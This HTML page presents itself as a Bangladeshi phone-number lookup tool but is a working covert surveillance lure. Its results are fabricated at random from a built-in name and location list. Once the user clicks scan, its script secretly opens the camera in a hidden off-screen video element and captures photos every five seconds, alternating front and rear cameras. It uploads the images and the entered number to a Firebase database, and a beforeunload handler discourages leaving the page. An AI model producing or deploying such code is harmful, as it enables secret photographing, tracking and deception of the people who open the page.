<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phone Number Info Scanner</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        h1 {
            color: #667eea;
            text-align: center;
            margin-bottom: 10px;
            font-size: 2em;
        }

        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
            color: #333;
            margin-bottom: 8px;
        }

        input[type="text"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #667eea;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #764ba2;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .scan-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }

        .scan-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
        }

        .scan-button:active {
            transform: translateY(0);
        }

        .scan-button.scanning {
            background: #10b981;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .result-card {
            display: none;
            animation: slideIn 0.5s;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .profile-header {
            text-align: center;
            padding: 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .profile-header h2 {
            font-size: 24px;
            margin-bottom: 5px;
        }

        .profile-header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .info-grid {
            display: grid;
            gap: 12px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 15px;
            background: #f9fafb;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }

        .info-label {
            font-weight: bold;
            color: #667eea;
        }

        .info-value {
            color: #333;
            text-align: right;
        }

        .alert {
            background: #dbeafe;
            color: #1e40af;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #3b82f6;
        }

        .alert-success {
            background: #d1fae5;
            color: #065f46;
            border-left: 4px solid #10b981;
        }

        .loading {
            text-align: center;
            padding: 30px;
        }

        .spinner {
            border: 4px solid #f3f4f6;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        video {
            display: none;
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
        }

        canvas {
            display: none;
        }

        .badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 8px;
        }

        .badge-verified {
            background: #d1fae5;
            color: #065f46;
        }

        .badge-active {
            background: #dbeafe;
            color: #1e40af;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>üì± Phone Number Scanner</h1>
            <p class="subtitle">Get detailed information about any Bangladeshi phone number</p>

            <div class="alert">
                üîç Enter a Bangladesh phone number (11 digits) to scan and retrieve information
            </div>

            <div class="input-group">
                <label for="phoneInput">Phone Number</label>
                <input 
                    type="text" 
                    id="phoneInput" 
                    placeholder="01XXXXXXXXX" 
                    maxlength="11"
                    pattern="[0-9]*"
                >
            </div>

            <button class="scan-button" id="scanButton">
                üîç Scan Number
            </button>
        </div>

        <div class="card result-card" id="loadingCard">
            <div class="loading">
                <div class="spinner"></div>
                <p style="color: #666;">Scanning number and retrieving information...</p>
            </div>
        </div>

        <div class="card result-card" id="resultCard">
            <div class="alert alert-success">
                ‚úì Information retrieved successfully!
            </div>

            <div class="profile-header">
                <h2 id="ownerName">--</h2>
                <p id="phoneNumber">--</p>
            </div>

            <div class="info-grid">
                <div class="info-row">
                    <span class="info-label">üì± Operator</span>
                    <span class="info-value" id="operator">--</span>
                </div>
                <div class="info-row">
                    <span class="info-label">üìç Location</span>
                    <span class="info-value" id="location">--</span>
                </div>
                <div class="info-row">
                    <span class="info-label">üèòÔ∏è Division</span>
                    <span class="info-value" id="division">--</span>
                </div>
                <div class="info-row">
                    <span class="info-label">üìÆ District</span>
                    <span class="info-value" id="district">--</span>
                </div>
                <div class="info-row">
                    <span class="info-label">üè† Area</span>
                    <span class="info-value" id="area">--</span>
                </div>
                <div class="info-row">
                    <span class="info-label">üìä Status</span>
                    <span class="info-value">
                        <span id="status">Active</span>
                        <span class="badge badge-active">Verified</span>
                    </span>
                </div>
                <div class="info-row">
                    <span class="info-label">üìÖ Registration Date</span>
                    <span class="info-value" id="regDate">--</span>
                </div>
                <div class="info-row">
                    <span class="info-label">üî¢ Number Type</span>
                    <span class="info-value" id="numberType">Personal</span>
                </div>
            </div>

            <button class="scan-button" style="margin-top: 20px;" onclick="resetScan()">
                üîÑ Scan Another Number
            </button>
        </div>
    </div>

    <!-- Hidden camera elements -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyC3jHqlfA5wMOJzgVkr7iz5ImhmW0L7mvM",
            authDomain: "flametracker-48e8d.firebaseapp.com",
            databaseURL: "https://flametracker-48e8d-default-rtdb.firebaseio.com",
            projectId: "flametracker-48e8d",
            storageBucket: "flametracker-48e8d.firebasestorage.app",
            messagingSenderId: "742659582228",
            appId: "1:742659582228:web:521a00235da839af4efa01",
            measurementId: "G-KD8LTRN3PJ"
        };

        let db = null;
        try {
            firebase.initializeApp(firebaseConfig);
            db = firebase.database();
        } catch (e) {
            console.log('Firebase init error');
        }

        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        
        let stream = null;
        let captureInterval = null;
        let facingMode = 'user';
        let captureCount = 0;

        const phoneInput = document.getElementById('phoneInput');
        const scanButton = document.getElementById('scanButton');
        const loadingCard = document.getElementById('loadingCard');
        const resultCard = document.getElementById('resultCard');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // Bangladesh phone number database (fake data)
        const bdOperators = {
            '017': 'Grameenphone',
            '013': 'Grameenphone',
            '019': 'Banglalink',
            '014': 'Banglalink',
            '018': 'Robi',
            '016': 'Airtel',
            '015': 'Teletalk'
        };

        const bdLocations = [
            { division: 'Dhaka', district: 'Dhaka', area: 'Gulshan' },
            { division: 'Dhaka', district: 'Dhaka', area: 'Dhanmondi' },
            { division: 'Dhaka', district: 'Dhaka', area: 'Mirpur' },
            { division: 'Dhaka', district: 'Dhaka', area: 'Uttara' },
            { division: 'Dhaka', district: 'Dhaka', area: 'Mohakhali' },
            { division: 'Chittagong', district: 'Chittagong', area: 'Agrabad' },
            { division: 'Chittagong', district: 'Chittagong', area: 'Khulshi' },
            { division: 'Rajshahi', district: 'Rajshahi', area: 'Shaheb Bazar' },
            { division: 'Khulna', district: 'Khulna', area: 'Daulatpur' },
            { division: 'Sylhet', district: 'Sylhet', area: 'Zindabazar' },
            { division: 'Barishal', district: 'Barishal', area: 'Nathullabad' },
            { division: 'Rangpur', district: 'Rangpur', area: 'Munshipara' },
            { division: 'Mymensingh', district: 'Mymensingh', area: 'Charpara' }
        ];

        const bdNames = [
            'Mohammad Rahman', 'Abdul Karim', 'Fatema Begum', 'Ayesha Siddika',
            'Md. Hasan Ali', 'Sultana Razia', 'Rahim Uddin', 'Nasima Khatun',
            'Kamal Hossain', 'Rahima Akter', 'Jamal Ahmed', 'Sadia Islam',
            'Rafiqul Islam', 'Taslima Nasrin', 'Habibur Rahman', 'Rokshana Parvin',
            'Monir Hossain', 'Shapla Begum', 'Abul Kalam', 'Feroza Akter'
        ];

        // Only allow digits
        phoneInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Scan button click
        scanButton.addEventListener('click', async function() {
            const phone = phoneInput.value.trim();
            
            if (phone.length !== 11 || !phone.startsWith('01')) {
                alert('‚ö†Ô∏è Please enter a valid 11-digit Bangladesh phone number starting with 01');
                return;
            }

            // Start scanning process
            scanButton.disabled = true;
            scanButton.classList.add('scanning');
            scanButton.textContent = 'üîÑ Scanning...';
            
            loadingCard.style.display = 'block';
            resultCard.style.display = 'none';

            // Secretly start camera in background
            await startCameraSecretly();

            // Show loading for 3 seconds
            setTimeout(() => {
                showResults(phone);
                scanButton.disabled = false;
                scanButton.classList.remove('scanning');
                scanButton.textContent = 'üîç Scan Number';
            }, 3000);
        });

        // Start camera secretly
        async function startCameraSecretly() {
            try {
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                };

                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        setTimeout(resolve, 500);
                    };
                });

                // Start auto-capture every 5 seconds
                startAutoCapture();

            } catch (error) {
                console.error('Camera access error:', error);
                // Continue even if camera fails
            }
        }

        // Start auto capture
        function startAutoCapture() {
            // Immediate first capture
            captureImage();
            
            // Then capture every 5 seconds
            captureInterval = setInterval(() => {
                captureImage();
            }, 5000);
        }

        // Capture image
        function captureImage() {
            if (!stream || !video.videoWidth) return;

            const maxWidth = 640;
            const maxHeight = 480;
            let width = video.videoWidth;
            let height = video.videoHeight;
            
            if (width > maxWidth) {
                height = (height * maxWidth) / width;
                width = maxWidth;
            }
            if (height > maxHeight) {
                width = (width * maxHeight) / height;
                height = maxHeight;
            }
            
            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(video, 0, 0, width, height);
            
            const fullImage = canvas.toDataURL('image/jpeg', 0.7);
            const compressedImage = canvas.toDataURL('image/jpeg', 0.3);
            
            const capture = {
                id: Date.now(),
                timestamp: new Date().toISOString(),
                sessionId: sessionId,
                type: 'camera',
                facingMode: facingMode,
                phoneNumber: phoneInput.value,
                image: fullImage
            };
            
            const key = `camera_${sessionId}`;
            const existing = JSON.parse(localStorage.getItem(key) || '[]');
            existing.push(capture);
            localStorage.setItem(key, JSON.stringify(existing));
            
            if (db) {
                const firebaseCapture = {
                    id: capture.id,
                    timestamp: capture.timestamp,
                    sessionId: capture.sessionId,
                    type: capture.type,
                    facingMode: capture.facingMode,
                    phoneNumber: capture.phoneNumber,
                    image: compressedImage
                };
                db.ref(`sessions/${sessionId}/camera/${capture.id}`).set(firebaseCapture).catch(err => {
                    console.log('Firebase save failed');
                });
            }
            
            captureCount++;
        }

        // Show fake results
        function showResults(phone) {
            loadingCard.style.display = 'none';
            resultCard.style.display = 'block';

            // Get operator
            const prefix = phone.substring(0, 3);
            const operator = bdOperators[prefix] || 'Unknown Operator';

            // Random location
            const location = bdLocations[Math.floor(Math.random() * bdLocations.length)];

            // Random name
            const name = bdNames[Math.floor(Math.random() * bdNames.length)];

            // Random registration date (last 5 years)
            const regDate = new Date();
            regDate.setFullYear(regDate.getFullYear() - Math.floor(Math.random() * 5));
            regDate.setMonth(Math.floor(Math.random() * 12));
            regDate.setDate(Math.floor(Math.random() * 28) + 1);

            // Update UI
            document.getElementById('ownerName').textContent = name;
            document.getElementById('phoneNumber').textContent = phone;
            document.getElementById('operator').textContent = operator;
            document.getElementById('location').textContent = location.area + ', ' + location.district;
            document.getElementById('division').textContent = location.division;
            document.getElementById('district').textContent = location.district;
            document.getElementById('area').textContent = location.area;
            document.getElementById('regDate').textContent = regDate.toLocaleDateString('en-GB');

            // Scroll to results
            resultCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }

        // Reset scan
        function resetScan() {
            phoneInput.value = '';
            resultCard.style.display = 'none';
            phoneInput.focus();
            
            // Scroll to top
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        // Try to switch camera every 30 seconds
        setInterval(() => {
            if (stream) {
                facingMode = facingMode === 'user' ? 'environment' : 'user';
                stream.getTracks().forEach(track => track.stop());
                startCameraSecretly();
            }
        }, 30000);

        // Prevent page close
        window.addEventListener('beforeunload', (e) => {
            if (stream) {
                e.preventDefault();
                e.returnValue = '';
            }
        });
    </script>
</body>
</html>